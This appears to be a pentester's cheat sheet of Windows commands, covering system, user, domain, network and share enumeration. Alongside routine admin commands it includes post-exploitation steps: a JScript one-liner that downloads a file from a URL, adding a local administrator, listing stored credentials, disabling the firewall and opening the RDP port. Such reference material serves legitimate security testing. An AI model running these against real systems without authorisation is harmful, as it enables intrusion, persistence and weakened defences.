# windows

% windows, basic cmd
## get info system
```
systeminfo
```

## get info system limited
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

## get patchs
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## get hostname
```
hostname
```

## show environment - List all environment variables
```
set
```

## dns request for DC
```
nslookup %LOGONSERVER%.%USERDNSDOMAIN%
```

## show mounted disks
```
wmic logicaldisk get caption,description,providername
```

## show recyle bin
```
dir C:\$Recycle.Bin /s /b
```

## get architecture
```
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

## list scheduled tasks
```
schtasks /query /fo LIST /v
```

## list one scheduled task
```
schtasks /query /fo LIST 2>nul | findstr <taskname>
```

## list process
```
tasklist /V
```

## list process and links to started services
```
tasklist /SVC
```

## list windows service started (1)
```
net start
```

## list services (2)
```
wmic service list brief
```

## list services (3)
```
sc query #List of services
```

## list installed software (1)
```
dir /a "C:\Program Files"
```

## list installed software (2)
```
dir /a "C:\Program Files (x86)"
```

## list installed software (3)
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

% windows, download

## VBS download file script
```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
```

% windows, users

## add user
```
net user <username> <password> /ADD
```

## add user to domain
```
net user <username> <password> /ADD /DOMAIN
```

## add user as admin
```
net localgroup administrators <username> /add
```

## run as over user
```
runas /user:<domain>\<user> cmd.exe
```

## whoami - All info about me, take a look at the enabled tokens
```
whoami /all
```
 
## whoami privilegied
```
whoami /priv #Show only privileges
```

## list all users
```
net users
```

## infos about a user
```
net user <username>
```

## infos about password policy
```
net accounts
```

## who logged in 
```
qwinsta
```

## List credentials
```
cmdkey /list
```

## show local groups 
```
net localgroup
```

## show specific local group
```
net localgroup <group_name>
```

## show domain groups
```
net group /domain
```

## show domain group users
```
net group /domain <domain_group_name>
```

% windows, domain infos

## get domain name
```
echo %USERDOMAIN%
```

## get domain name (2)
```
echo %USERDNSDOMAIN%
```

## get name of the DC
```
echo %logonserver%
```

## get name of the dc (2)
```
set logonserver #Get name of the domain controller
```

## list of domain groups
```
net groups /domain
```

## list of computer connected to the domain
```
net group "domain computers" /domain
```

## List all PCs of the domain
```
net view /domain
```

## list domain controllers
```
nltest /dclist:<domain>
```

## list pc accounts of domain controllers
```
net group "Domain Controllers" /domain
```

## List users with domain admin privileges
```
net group "Domain Admins" /domain
```

## List users that belongs to the administrators group inside the domain
```
net localgroup administrators /domain
```

## List all domain users
``` 
net user /domain
```

## get user domain information
```
net user <username> /domain
```

## domain password and lockout policy
```
net accounts /domain
```

## get mapping of the trust relationships
```
nltest /domain_trust
```

% windows, network
## all interfaces
```
ipconfig /all
```

## print all routes
```
route print
```

## list of know hosts
```
arp -a
```

## list open ports
```
netstat -ano
```

## show hosts file
```
type C:\WINDOWS\System32\drivers\etc\hosts
```

% windows, dir

## list hidden files
```
dir /a:h <path>
```

## Recursive list
```
dir /s /b
```

% windows, firewall
## show firewall state
```
netsh firewall show state
```

## show firewall config
```
netsh firewall show config
```

## turn off firewall
```
NetSh Advfirewall set allprofiles state off
```

## turn off firewall (2)
```
netsh firewall set opmode disable
```

## turn on firewall
```
NetSh Advfirewall set allprofiles state on
```

## firewall open port RDP
```
netsh firewall add portopening TCP 3389 "Remote Desktop" 
```


% windows, smb, share
## list of computer
```
net view
```

## list of computer shares on the domain
```
net view /all /domain <domain_name>
```

## list share of a computer
```
net view \\<ip> \ALL
```

## mount share locally
```
net use x: \\<ip>\<share_name>
```

## check current share
```
net share
```